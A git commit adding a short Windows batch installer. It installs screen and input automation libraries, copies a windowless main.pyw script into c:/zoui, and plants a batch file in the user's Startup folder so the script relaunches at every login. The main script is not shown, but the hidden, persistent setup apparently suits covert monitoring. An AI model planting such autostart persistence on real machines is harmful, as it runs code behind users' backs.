48e933bedd317821488c48dc1485678db25cd76f
Ayad seghairi <85361584+ayadseghairi@users.noreply.github.com>
2023-04-05 16:17:52 +0100

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,7 @@
+pip install opencv-python
+pip install PyAutoGUI
+pip install numpy
+copy main.pyw c:/zoui/main.pyw
+echo del c:\zoui\s.txt\npython3 c:/zoui/main.pyw > "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\s.bat"
+echo 1 > c:/zoui/s.txt
+python3 c:/zoui/main.pyw
